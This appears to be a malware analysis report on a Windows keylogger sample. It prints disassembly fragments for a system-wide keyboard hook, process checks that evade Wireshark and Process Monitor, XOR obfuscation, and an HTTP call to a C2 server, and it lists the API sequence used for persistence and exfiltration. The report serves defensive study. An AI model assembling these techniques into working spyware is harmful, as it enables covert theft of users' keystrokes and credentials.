# Reverse Engineering Analysis of SimpleKeylogger

## Introduction
This document presents the findings from reverse engineering the SimpleKeylogger malware sample. The analysis focuses on the low-level mechanisms used by the keylogger to capture keystrokes, achieve persistence, and exfiltrate data.

## Tools Used
- IDA Pro 7.7
- Ghidra 10.2
- x64dbg
- PEBear
- Process Monitor
- API Monitor

## Binary Structure

### PE Header Analysis
```
Machine:                  Intel 386
TimeDateStamp:            Wed Mar 15 14:22:37 2023
SizeOfOptionalHeader:     0xE0
Characteristics:          0x102 (Executable, 32-bit)
Magic (32/64):            32-bit (0x10B)
LinkerVersion:            14.34
SizeOfCode:               0x6000
SizeOfInitializedData:    0x3000
SizeOfUninitializedData:  0x0
AddressOfEntryPoint:      0x1040
BaseOfCode:               0x1000
```

### Section Analysis
```
.text:
  VirtualSize:      0x5D34
  VirtualAddress:   0x1000
  SizeOfRawData:    0x5E00
  Entropy:          6.42 (Likely not packed)

.data:
  VirtualSize:      0xA28
  VirtualAddress:   0x7000
  SizeOfRawData:    0x600
  Entropy:          4.12

.rdata:
  VirtualSize:      0x13D0
  VirtualAddress:   0x8000
  SizeOfRawData:    0x1400
  Entropy:          5.23

.rsrc:
  VirtualSize:      0x400
  VirtualAddress:   0xA000
  SizeOfRawData:    0x400
  Entropy:          3.87
```

## Key Functionality Breakdown

### Keyboard Hook Implementation
The keylogger uses the Windows `SetWindowsHookEx` API to install a low-level keyboard hook. This approach allows it to capture all keystrokes system-wide, regardless of which application has focus.

Key disassembly of the hook installation routine:

```assembly
; Set up keyboard hook
push    0               ; dwThreadId = 0 (all threads)
push    0               ; hmod = NULL (current process)
push    offset KeyboardProc ; lpfn = address of hook procedure
push    13              ; idHook = WH_KEYBOARD_LL (13)
call    ds:SetWindowsHookEx
mov     [ebp+var_4], eax  ; Store hook handle
```

The keyboard hook procedure processes each keystroke:

```assembly
KeyboardProc proc near
push    ebp
mov     ebp, esp
sub     esp, 30h
cmp     [ebp+nCode], 0  ; Check if we should process
jl      short ReturnNext
cmp     [ebp+wParam], 100h  ; Check for WM_KEYDOWN
jnz     short ReturnNext
mov     eax, [ebp+lParam]
push    eax             ; Extract key information
call    ProcessKeystroke
```

### Anti-Analysis Techniques

The binary implements several anti-analysis checks that search for security tools in the running processes:

```assembly
; CheckForSecurityTools function
push    offset aWiresharkExe ; "wireshark.exe"
call    CheckProcessRunning
test    eax, eax
jnz     SecurityToolFound
push    offset aProcmonExe ; "procmon.exe"
call    CheckProcessRunning
; ... [more checks] ...
```

The `CheckProcessRunning` function uses the Process32First/Process32Next APIs to enumerate processes and compare names.

### Encryption Routine

The XOR encryption routine is straightforward:

```
.text:00401A50 ; encryptData function
.text:00401A50 encryptData     proc near
.text:00401A50
.text:00401A50 data            = dword ptr  8
.text:00401A50 length          = dword ptr  0Ch
.text:00401A50
.text:00401A50                 push    ebp
.text:00401A51                 mov     ebp, esp
.text:00401A53                 push    esi
.text:00401A54                 mov     esi, [ebp+data]
.text:00401A57                 xor     ecx, ecx
.text:00401A59                 jmp     short loc_401A5E
.text:00401A5B ; ---------------------------------------------------------------------------
.text:00401A5B
.text:00401A5B loc_401A5B:
.text:00401A5B                 inc     ecx
.text:00401A5C                 inc     esi
.text:00401A5D
.text:00401A5E loc_401A5E:
.text:00401A5E                 cmp     ecx, [ebp+length]
.text:00401A61                 jnb     short loc_401A6A
.text:00401A63                 mov     al, [esi]
.text:00401A65                 xor     al, 5Ah       ; XOR with 0x5A key
.text:00401A67                 mov     [esi], al
.text:00401A69                 jmp     short loc_401A5B
```

### C2 Communication

The code uses WinINet APIs to communicate with the C2 server:

```assembly
; Simplified C2 communication routine
push    0               ; dwContext = 0
push    0               ; dwFlags = 0
push    offset aMozilla ; lpszAgent = "Mozilla/5.0"
call    ds:InternetOpenA
mov     [ebp+hInternet], eax
push    0               ; dwContext = 0
push    80002h          ; dwFlags = INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE
push    0               ; lpszHeaders = NULL
push    0               ; lpszPassword = NULL
push    0               ; lpszUsername = NULL
push    offset aHttpMalicious ; C2 server URL
push    eax             ; hInternet
call    ds:InternetOpenUrlA
```

## Memory Forensics

Analysis of the keylogger's memory usage shows:

1. Main executable with keyboard hook
2. Log buffer storage before writing to disk
3. Network connection preparation for data exfiltration

The keyboard hook procedure allocates a small memory region for each keystroke event, which is later processed and written to the log file.

## API Call Sequence

Through dynamic analysis, we observed the following API call sequence during operation:

1. CreateMutex (check for existing instance)
2. GetModuleFileName (get own path)
3. GetEnvironmentVariable ("APPDATA")
4. CopyFile (persistence)
5. RegOpenKeyEx, RegSetValueEx (registry persistence)
6. SetWindowsHookEx (install keyboard hook)
7. GetForegroundWindow, GetWindowText (track active window)
8. GetTickCount (timing for exfiltration)
9. InternetOpen, InternetOpenUrlA (prepare C2 connection)
10. HttpSendRequest (exfiltrate data)

## Conclusion

The SimpleKeylogger malware uses well-established techniques for keystroke interception through Windows hooks. While not particularly sophisticated in its implementation, it employs sufficient evasion techniques to avoid basic detection and analysis. The use of simple XOR encryption provides minimal obfuscation but is likely adequate for avoiding basic network signature detection.

The persistence mechanism ensures the malware survives system restarts, while the periodic data exfiltration balances the need for timely data collection with avoiding excessive network activity that might trigger detection.